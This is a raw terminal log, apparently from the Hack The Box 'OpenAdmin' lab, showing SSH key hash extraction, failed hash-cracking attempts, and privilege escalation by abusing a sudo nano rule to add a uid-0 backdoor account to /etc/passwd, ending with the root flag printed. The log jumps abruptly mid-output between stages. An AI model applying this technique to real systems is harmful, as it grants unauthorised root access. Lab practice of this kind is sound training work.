┌─[root@parrot]─[~/hackthebox/openadmin]   
└──╼ #cd /opt/                             
┌─[root@parrot]─[/opt]                     
└──╼ #ls                                   
BloodHound          finger-user-enum     impacket           php-reverse-shell                           SecLists      tmux-yank                  wordlists                    
BurpSuiteCommunity  firmware-mod-kit     JAWS               PowerSploit                                 ssh2john.c    truffleHog                 xplico                       
car-hacking         fsociety             linux_privsec      privilege-escalation-awesome-scripts-suite  Sublist3r     Ultimate-Facebook-Scraper  Yuki-Chan-The-Auto-Pentest   
ctf-tools           ghidra               mRemoteNG-Decrypt  PRTG-Network-Monitor-RCE                    Teeth         unicorn                                                 
dirsearch           ghidra_9.1.1_PUBLIC  nishang            pspy                                        tmux          Veil                                                    
Empire              gobuster             passwords          python3-pwntools                            tmux-logging  wicd-git                                                
┌─[root@parrot]─[/opt]                     
└──╼ #rm ssh2john.c                        
┌─[root@parrot]─[/opt]                     
└──╼ #vi ssh2john.py                       
┌─[root@parrot]─[/opt]                     
└──╼ #chmod +x ssh2john.py                 
┌─[root@parrot]─[/opt]                     
└──╼ #./ssh2john.py ~/hackthebox/openadmin/joanna ~/hackthebox/openadmin/joanna.hash   
/root/hackthebox/openadmin/joanna:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d                                       
[/root/hackthebox/openadmin/joanna.hash] couldn't parse keyfile                        
┌─[root@parrot]─[/opt]                     
└──╼ #cd -                                 
/root/hackthebox/openadmin                 
┌─[root@parrot]─[~/hackthebox/openadmin]   
└──╼ #ls                                   
creds  exploit.sh  joanna  joanna.hash  l.sh  nmap  reverse.sh  shell.sh  www          
┌─[root@parrot]─[~/hackthebox/openadmin]   
└──╼ #vi joanna.hash                       
┌─[root@parrot]─[~/hackthebox/openadmin]   
└──╼ #john -m 16700 joanna.hash --wordlist=/opt/wordlists/rockyou.txt --force                                                                                                 
Unknown option: "-m"                       
┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]                                           
└──╼ #hashcat -m 16700 joanna.hash --wordlist=/opt/wordlists/rockyou.txt --force                                                                                              
hashcat: option '--wordlist-autohex-disable' doesn't allow an argument                 
Invalid argument specified.                

┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]                                           
└──╼ #hashcat -m 16700 joanna.hash -wordlist=/opt/wordlists/rockyou.txt --force                                                                                               
The specified parameter cannot use 'ordlist=/opt/wordlists/rockyou.txt' as a value - must be a number.                                                                        

┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]                                           
└──╼ #hashcat --help                       
hashcat - advanced password recovery       

Usage: hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...    

- [ Options ] -                            

 Options Short / Long           | Type | Description                                          | Example                                                                       
drwxr-xr-x  3 root     root     4096 Jan 10 17:19 .                                    
drwxr-xr-x 24 root     root     4096 Nov 21 13:41 ..                                   
drwxr-x---  7 www-data www-data 4096 Nov 21 18:23 ona                                  
-rw-r--r--  1 root     root        0 Nov 22 23:49 priv                                 
joanna@openadmin:/opt$ nano privi          
joanna@openadmin:/opt$ cd /dev/shm         
joanna@openadmin:/dev/shm$ nano privi      
joanna@openadmin:/dev/shm$ ls              
privi                                      
joanna@openadmin:/dev/shm$ cat privi       
#!/bin/bash                                
echo "giving u bash"                       

/bin/bash                                  
joanna@openadmin:/dev/shm$ ls -la          
total 4                                    
drwxrwxrwt  2 root   root     60 Jan 11 02:56 .                                        
drwxr-xr-x 18 root   root   3820 Jan 10 13:49 ..                                       
-rw-rw-r--  1 joanna joanna   44 Jan 11 02:56 privi                                    
joanna@openadmin:/dev/shm$ echo -n '/bin/bash' > /opt/priv                             
-bash: /opt/priv: Permission denied        
joanna@openadmin:/dev/shm$ cd ~            
joanna@openadmin:~$ nano arrow             
joanna@openadmin:~$ ls -la                 
total 48                                   
drwxr-x--- 6 joanna joanna 4096 Jan 11 02:58 .                                         
drwxr-xr-x 4 root   root   4096 Nov 22 18:00 ..                                        
-rw-rw-r-- 1 joanna joanna   23 Jan 11 02:58 arrow                                     
lrwxrwxrwx 1 joanna joanna    9 Nov 22 18:02 .bash_history -> /dev/null                
-rw-r--r-- 1 joanna joanna  220 Nov 22 18:00 .bash_logout                              
-rw-r--r-- 1 joanna joanna 3771 Nov 22 18:00 .bashrc                                   
drwx------ 2 joanna joanna 4096 Nov 22 22:42 .cache                                    
drwx------ 3 joanna joanna 4096 Nov 22 22:42 .gnupg                                    
drwxrwxr-x 3 joanna joanna 4096 Nov 22 18:53 .local                                    
-rw-r--r-- 1 joanna joanna  807 Nov 22 18:00 .profile                                  
drwx------ 2 joanna joanna 4096 Nov 23 17:31 .ssh                                      
-rw-rw-r-- 1 joanna joanna   33 Nov 28 09:37 user.txt                                  
-rw------- 1 joanna joanna  802 Jan 11 02:50 .viminfo                                  
joanna@openadmin:~$ sudo -l                
Matching Defaults entries for joanna on openadmin:                                     
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                         

User joanna may run the following commands on openadmin:                               
    (ALL) NOPASSWD: /bin/nano /opt/priv    
joanna@openadmin:~$ sud^C                  
joanna@openadmin:~$ sudo /bin/nano /opt/priv                                           
joanna@openadmin:~$ sudo -u arrow          
usage: sudo -h | -K | -k | -V              
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]                      
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]  
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]                                  
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...                                                          
joanna@openadmin:~$ sudo arrow             
[sudo] password for joanna:                
Sorry, try again.                          
[sudo] password for joanna:                
Sorry, try again.                          
[sudo] password for joanna:                
sudo: 3 incorrect password attempts        
joanna@openadmin:~$ su                     
Password:                                  
su: Authentication failure                 
joanna@openadmin:~$ su                     
Password:                                  
su: Authentication failure                 
joanna@openadmin:~$ su - arrow             
Password:                                  
su: Authentication failure                 
joanna@openadmin:~$ cat /etc/passwd        
root:x:0:0:root:/root:/bin/bash            
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                        
bin:x:2:2:bin:/bin:/usr/sbin/nologin       
sys:x:3:3:sys:/dev:/usr/sbin/nologin       
sync:x:4:65534:sync:/bin:/bin/sync         
games:x:5:60:games:/usr/games:/usr/sbin/nologin                                        
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                        
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                           
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                            
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                      
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                    
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                   
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                   
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                          
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                       
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin      
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin                             
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin                                                                                  
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin   
syslog:x:102:106::/home/syslog:/usr/sbin/nologin                                       
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin                                   
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin                                       
lxd:x:105:65534::/var/lib/lxd/:/bin/false  
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin                                          
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin                         
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin                              
pollinate:x:109:1::/var/cache/pollinate:/bin/false                                     
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin                                          
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash                                          
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false                                
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash                                          
arrow:a44ow:0:0:root:/root:/bin/bash       
joanna@openadmin:~$ su - arrow             
Password:                                  
su: Authentication failure                 
joanna@openadmin:~$ sudo /bin/nano /opt/priv                                                                                                                                  
joanna@openadmin:~$ su - arrow             
Password:                                  
su: Authentication failure                 
joanna@openadmin:~$ sudo /bin/nano /opt/priv                                           
joanna@openadmin:~$ less /etc/passwd       
joanna@openadmin:~$                        
joanna@openadmin:~$ su - arrow             
Password:                                  
root@openadmin:~# ls                       
root.txt                                   
root@openadmin:~# cat root.txt             
2f907ed450b361b2c2bf4e8795d5b561           
root@openadmin:~# find / -name root.txt    
/root/root.txt                             
root@openadmin:~# exit                     
logout                                     
joanna@openadmin:~$ exit                   
logout                                     
Connection to 10.10.10.171 closed.         
┌─[root@parrot]─[~/hackthebox/openadmin]   
└──╼ #                                     
